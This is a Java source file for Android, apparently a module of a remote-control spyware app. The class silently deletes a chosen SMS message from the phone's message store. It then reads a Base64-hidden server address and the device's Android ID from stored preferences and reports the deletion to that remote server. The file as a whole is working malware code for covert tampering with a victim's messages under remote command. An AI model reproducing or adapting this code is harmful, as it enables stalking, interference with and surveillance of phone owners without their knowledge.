package com.asynctask;

import android.content.ContentResolver;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Base64;

import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.UnsupportedEncodingException;

/**
 * Created by Conan0xff on 2017/12/5.
 */

public class deleteSms extends AsyncTask<String, Void, String> {
    String i = "";
    String j = "";

    public deleteSms(String i, String j) {
        this.i = i;
        this.j = j;
    }

    @Override
    protected String doInBackground(String... params) {
        Uri thread = Uri.parse("content://sms");
        ContentResolver contentResolver = MyApplication.getContext().getContentResolver();
//			Cursor cursor = contentResolver.query(thread, null, null, null,null);
        contentResolver.delete(thread, "thread_id=? and _id=?", new String[]{String.valueOf(i), String.valueOf(j)});

        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "SMS Delete [" + i + "] [" + j + "] Complete");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }

        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
    }

    @Override
    protected void onPreExecute() {
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}

